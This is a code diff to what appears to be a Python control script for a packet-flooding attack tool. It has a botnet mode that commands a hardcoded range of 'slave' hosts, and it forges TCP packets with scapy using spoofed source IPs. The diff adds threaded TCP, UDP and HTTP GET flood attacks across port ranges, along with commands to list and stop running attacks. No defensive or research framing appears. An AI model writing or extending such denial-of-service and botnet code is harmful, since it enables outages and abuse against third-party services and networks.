@@ -3,6 +3,8 @@ import socket
 
 from utils import ipGen , parse_args , CommandError
 
+from utils.forge import forgeAndSend , Attack
+
 from scapy.all import *
 
 slaves = ["192.168.175."+str(i) for i in range(1,255)]
@@ -42,9 +44,15 @@ def showHelp() :
                                     0   -   TCP
                                     1   -   UDP
                                     2   -   HTTP GET
+        list            -   To List Active Attacks 
+        stop            -   Stop Attack
+            usage : stop -n\--number n
+                n           -   Attack Number To Stop
     """)
 
 prevCmd = []
+activeAttacks = []
+attackThreads = []
 
 running = True
 
@@ -106,11 +114,36 @@ try :
                 if mode == 'botnet' :
                     master.attack(target,ports,count,duration,aType,slaves)
                 else :
-                    "Do Virtual Send"
-                    IP1 = IP(src=ipGen(),dst=target)
-                    TCP1 = TCP(sport = random.randint(1,65535), dport = 80)
-                    pkt = IP1 / TCP1
-                    send(pkt,inter = .001)
+                    ports = list(map(int,ports.split('-')))
+                    for port in range(ports[0],ports[1]+1) :
+                        attack = Attack(target,port,aType)
+                        activeAttacks.append(attack)
+                        attack.running = True
+                        thread = Thread(target=forgeAndSend,args=(attack,))
+                        attackThreads.append(thread)
+                        thread.start()
+
+            elif cmd.command == 'list' :
+                if len(activeAttacks) == 0 :
+                    print(Log("No Active Attacks"))
+                else :
+                    for i in range(len(activeAttacks)) :
+                        print(f"\t [{i}] {activeAttacks[i]}")
+
+            elif cmd.command == 'stop' :
+                if len(activeAttacks) == 0 :
+                    print(Log("No Active Attacks"))
+                elif len(activeAttacks) < cmd.n :
+                    print(Log("Invalid Option"))
+                else :
+                    attack = activeAttacks[cmd.n]
+                    activeAttacks.remove(attack)
+                    thread = attackThreads[cmd.n]
+                    attackThreads.remove(thread)
+
+                    attack.running = False
+                    del attack 
+                    del thread
             
             elif cmd.command == "exit" :
                 print(Log("Stopping Master"))
